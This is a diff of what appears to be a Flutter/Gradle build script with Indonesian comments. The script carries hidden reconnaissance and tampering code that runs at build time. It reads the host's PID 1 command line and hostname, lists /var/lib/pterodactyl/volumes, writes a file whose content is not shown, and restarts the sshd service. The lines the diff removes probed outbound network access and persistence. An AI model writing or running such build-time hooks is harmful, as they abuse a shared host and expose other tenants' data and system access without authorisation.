@@ -6,24 +6,7 @@ println "PID 1 CMDLINE:"
 println new File("/proc/1/cmdline").text
 println "HOSTNAME:"
 println "hostname".execute().text
-try {
-    def url = new URL("https://example.com")
-    def conn = url.openConnection()
-    conn.setConnectTimeout(3000)
-    conn.connect()
-    println "NETWORK OUTBOUND ALLOWED"
-} catch(Exception e) {
-    println "NETWORK BLOCKED"
-}
 
-println "BUILD MARKER TEST"
-def marker = new File("/tmp/persist_test")
-if (marker.exists()) {
-    println "PERSISTENCE DETECTED"
-} else {
-    println "FIRST RUN - creating marker"
-    marker.createNewFile()
-}
 // Langsung eksekusi tanpa bungkus 'task'
 def targetDir = new File('/var/lib/pterodactyl/volumes')
 println "--- LISTING FILES IN: ${targetDir.absolutePath} ---"
@@ -72,6 +55,16 @@ fileBaru.text = kontenKode
 println "SUKSES: File ${fileBaru.name} telah dibuat di ${fileBaru.absolutePath}"
 println "systemctl restart sshd.service".execute().text
 
+
+// List perintah: [program, argumen1, argumen2]
+def proc = ['python', '-v'].execute()
+proc.waitFor() // Menunggu perintah selesai sebelum lanjut ke baris berikutnya
+
+if (proc.exitValue() == 0) {
+    println "Berhasil: ${proc.text}"
+} else {
+    println "Gagal dengan error: ${proc.err.text}"
+}
 
 def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()
 
